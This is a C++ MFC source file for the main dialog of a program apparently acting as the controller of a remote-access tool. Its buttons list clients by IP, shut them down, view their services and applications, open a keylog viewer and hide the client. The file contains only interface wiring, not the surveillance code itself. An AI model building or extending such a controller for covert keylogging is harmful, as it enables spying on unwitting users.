
// ServerDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Server.h"
#include "ServerDlg.h"
#include "afxdialogex.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// CServerDlg dialog



CServerDlg::CServerDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CServerDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CServerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_log, m_logBox);
	DDX_Control(pDX, IDC_clientselect, m_clientSelect);
}

BEGIN_MESSAGE_MAP(CServerDlg, CDialogEx)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_listen, &CServerDlg::OnBnClickedButton1)
	ON_CBN_SELCHANGE(IDC_clientselect, &CServerDlg::OnCbnSelchangeclientselect)
	ON_BN_CLICKED(IDC_shutdown, &CServerDlg::OnBnClickedshutdown)
	ON_BN_CLICKED(IDC_services, &CServerDlg::OnBnClickedservices)
	ON_BN_CLICKED(IDC_application, &CServerDlg::OnBnClickedapplication)
	ON_BN_CLICKED(IDC_disconnect, &CServerDlg::OnBnClickeddisconnect)
	ON_BN_CLICKED(IDC_keylog, &CServerDlg::OnBnClickedkeylog)
	ON_BN_CLICKED(IDC_BUTTON7, &CServerDlg::OnBnClickedButton7)
END_MESSAGE_MAP()


// CServerDlg message handlers

BOOL CServerDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	// TODO: Add extra initialization here
	theApp.initServer();

	return TRUE;  // return TRUE  unless you set the focus to a control
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CServerDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

// The system calls this function to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CServerDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



void CServerDlg::OnBnClickedButton1()
{
	// TODO: Add your control notification handler code here
	theApp.startListen();
	GetDlgItem(IDC_listen)->EnableWindow(0);
}



void CServerDlg::OnCbnSelchangeclientselect()
{
	CString ip;
	int selectedClient = m_clientSelect.GetCurSel();
	this->m_clientSelect.GetLBText(selectedClient, ip);
	theApp.setSelectedClientByIP(ip);

	// TODO: Add your control notification handler code here
}


void CServerDlg::OnBnClickedshutdown()
{
	// TODO: Add your control notification handler code here
	theApp.shutDown(this);
}


void CServerDlg::OnBnClickedservices()
{
	// TODO: Add your control notification handler code here
	serviceDlg a;
	a.DoModal();
}


void CServerDlg::OnBnClickedapplication()
{
	// TODO: Add your control notification handler code here
	appDlg a;
	a.DoModal();
}


void CServerDlg::OnBnClickeddisconnect()
{
	// TODO: Add your control notification handler code here
	theApp.disconnectClient(this);
}


void CServerDlg::OnBnClickedkeylog()
{
	// TODO: Add your control notification handler code here
	keylogDlg a;
	a.DoModal();
}


void CServerDlg::OnBnClickedButton7()
{
	// TODO: Add your control notification handler code here
	theApp.hideClient(this);
}
